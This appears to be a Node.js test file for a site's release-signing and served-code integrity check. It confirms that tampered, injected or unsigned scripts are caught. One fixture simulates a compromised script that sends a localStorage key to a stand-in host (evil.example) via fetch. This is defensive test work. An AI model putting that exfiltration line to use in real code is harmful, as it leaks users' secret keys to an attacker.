// Release signing and the code check, against a fake site. Run: node --no-warnings scripts/code-check.test.mjs
// (one hybrid signature: about a minute)
import assert from "node:assert/strict";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import * as hybrid from "./hybrid-sig.mjs";
import { checkCode } from "./code-check.mjs";

let n = 0;
const ok = (c, m) => { assert.ok(c, m); n++; };
const tmp = fs.mkdtempSync(path.join(os.homedir(), ".zesuro-code-test-"));
process.on("exit", () => fs.rmSync(tmp, { recursive: true, force: true }));
const run = (...a) => spawnSync(process.execPath, ["--no-warnings", ...a], { encoding: "utf8" });

// A tiny "build": two scripts and a stylesheet
const staticDir = path.join(tmp, "static");
fs.mkdirSync(path.join(staticDir, "chunks"), { recursive: true });
const assets = { "/_next/static/chunks/app.js": "console.log('app')", "/_next/static/chunks/keys.js": "localStorage.getItem('k')", "/_next/static/css/site.css": "body{margin:0}" };
for (const [u, body] of Object.entries(assets)) { const f = path.join(staticDir, u.replace("/_next/static/", "")); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, body); }
fs.writeFileSync(path.join(staticDir, "chunks", "readme.txt"), "not code, not listed");

const rootDir = path.join(tmp, "root");
let r = run("scripts/root.mjs", "init", "--dir", rootDir); assert.equal(r.status, 0, r.stderr);
const root = hybrid.publicKeyOf(fs.readFileSync(path.join(rootDir, "root-key.json"), "utf8"));
const draft = path.join(tmp, "draft.json"), releaseFile = path.join(tmp, "release.json");
r = run("scripts/release.mjs", "hash", "--static", staticDir, "--out", draft); assert.equal(r.status, 0, r.stderr);
const d = JSON.parse(fs.readFileSync(draft, "utf8"));
ok(Object.keys(d.files).length === 3 && !Object.keys(d.files).some((k) => k.endsWith(".txt")), "the draft lists scripts and stylesheets only");
ok(JSON.stringify(Object.keys(d.files)) === JSON.stringify(Object.keys(d.files).sort()), "in a stable order");
r = run("scripts/release.mjs", "sign", "--draft", draft, "--dir", rootDir, "--out", releaseFile); assert.equal(r.status, 0, r.stderr);
const release = JSON.parse(fs.readFileSync(releaseFile, "utf8"));
ok(hybrid.verify(root, "release", release.manifest, release.sig), "the release is signed by the root key");
ok(!hybrid.verify(root, "delegation", release.manifest, release.sig), "and the signature is not a delegation");

const site = { release, assets: { ...assets }, extra: "" };
const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  if (u.pathname === "/api/release") { if (!site.release) { res.writeHead(404); return res.end("{}"); } res.writeHead(200, { "content-type": "application/json" }); return res.end(JSON.stringify(site.release)); }
  if (site.assets[u.pathname] !== undefined) { res.writeHead(200); return res.end(site.assets[u.pathname]); }
  const tags = ["/_next/static/chunks/app.js", "/_next/static/chunks/keys.js"].map((s) => `<script src="${s}?v=1" async></script>`).join("") + `<link rel="stylesheet" href="/_next/static/css/site.css">` + site.extra;
  res.writeHead(200, { "content-type": "text/html" }); res.end(`<html><head>${tags}</head><body>${u.pathname}</body></html>`);
});
await new Promise((res) => server.listen(0, "127.0.0.1", res));
const base = `http://127.0.0.1:${server.address().port}`;

let c = await checkCode(base, root);
ok(c.problems.length === 0 && c.checked === 3, "what the site serves matches the signed release\n" + c.problems.join("\n"));

site.assets["/_next/static/chunks/keys.js"] = "fetch('https://evil.example/?k='+localStorage.getItem('whenisaid.key.v1'))";
c = await checkCode(base, root);
ok(c.problems.length === 1 && /keys\.js differs from the signed release/.test(c.problems[0]), "an altered script is caught\n" + c.problems.join("\n"));
site.assets["/_next/static/chunks/keys.js"] = assets["/_next/static/chunks/keys.js"];

site.extra = `<script src="/_next/static/chunks/injected.js"></script>`; site.assets["/_next/static/chunks/injected.js"] = "steal()";
c = await checkCode(base, root);
ok(c.problems.some((p) => /injected\.js is served but is not in the signed release/.test(p)), "an extra, unsigned script is caught");
site.extra = "";

c = await checkCode(base, hybrid.generate().publicKey);
ok(c.problems.length === 1 && /not signed by the root key/.test(c.problems[0]), "a release signed by another root is refused");
c = await checkCode(base, "not-a-key");
ok(/no valid root key/.test(c.problems[0]), "a malformed root key is refused");

const forged = { manifest: release.manifest.replace(/"files"/, '"files"'), sig: release.sig };
forged.manifest = JSON.stringify({ ...JSON.parse(release.manifest), files: { ...JSON.parse(release.manifest).files, "/_next/static/chunks/keys.js": "0".repeat(64) } });
site.release = forged;
c = await checkCode(base, root);
ok(/not signed by the root key/.test(c.problems[0]), "editing the signed list breaks its signature");

site.release = null;
c = await checkCode(base, root);
ok(/no signed release is published/.test(c.problems[0]), "no published release is a failure, not a pass");

server.close();
console.log(`All ${n} code-check checks passed`);
